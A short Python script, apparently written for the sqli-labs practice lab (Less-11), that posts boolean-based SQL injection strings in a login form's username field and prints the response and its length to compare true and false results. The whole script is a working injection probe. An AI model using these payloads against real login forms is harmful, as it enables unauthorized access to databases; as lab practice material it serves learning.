# 测试脚本
import requests

url = 'http://demo.sqli.com/Less-11/'
data1 = "uname=admin' and 1=1 --+&passwd=123&submit=Submit"
data2 = "uname=admin' and 1=2 #&passwd=admin&submit=Submit"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
res = requests.post(url=url, data=data1, headers=headers)
ret = res.text
length = len(ret)
print(ret)
print(length)